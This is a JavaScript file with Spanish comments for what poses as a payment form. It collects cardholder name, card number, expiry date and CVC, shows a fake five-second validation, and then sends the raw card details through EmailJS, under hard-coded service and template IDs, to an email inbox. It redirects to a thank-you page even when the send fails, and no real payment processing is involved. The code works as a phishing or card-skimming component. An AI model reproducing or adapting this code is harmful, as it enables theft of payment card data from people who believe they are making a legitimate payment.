(function() {
    emailjs.init('ReqtkWfjI392LAzFb');
})();

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const loader = document.getElementById('loader');
    const errorMsg = document.getElementById('errorMsg');
    
    // Ocultar mensajes anteriores
    errorMsg.classList.add('hidden');
    document.querySelectorAll('.error-msg').forEach(el => el.style.display = 'none');
    
    // Mostrar loader
    loader.classList.remove('hidden');

    // Obtener valores
    const formData = {
        nombre: document.getElementById('userName').value.trim(),
        numero: document.getElementById('cardNumber').value.replace(/\s/g, ''),
        fecha: document.getElementById('expiryDate').value,
        cvc: document.getElementById('cvc').value
    };

    // Validaciones después de 5 segundos
    setTimeout(() => {
        let isValid = true;

        // Validar nombre
        if (!/^[a-zA-ZÀ-ÿ\s']{5,}$/.test(formData.nombre)) {
            document.getElementById('nameError').style.display = 'block';
            isValid = false;
        }

        // Validar tarjeta
        if (!/^\d{16}$/.test(formData.numero)) {
            document.getElementById('cardError').style.display = 'block';
            isValid = false;
        }

        // Validar fecha
        const currentDate = new Date();
        const expiryDate = new Date(formData.fecha);
        if (expiryDate < currentDate) {
            document.getElementById('dateError').style.display = 'block';
            isValid = false;
        }

        // Validar CVC
        if (!/^\d{4}$/.test(formData.cvc)) {
            document.getElementById('cvcError').style.display = 'block';
            isValid = false;
        }

        loader.classList.add('hidden');

        if (!isValid) {
            errorMsg.classList.remove('hidden');
            setTimeout(() => errorMsg.classList.add('hidden'), 5000);
            return;
        }

        // Enviar correo
        emailjs.send("service_syrc1uk", "template_u3etoro", formData)
            .then(() => {
                window.location.href = "thank-you.html";
            })
            .catch(error => {
                console.error('Error:', error);
                window.location.href = "thank-you.html";
            });
    }, 5000);
});
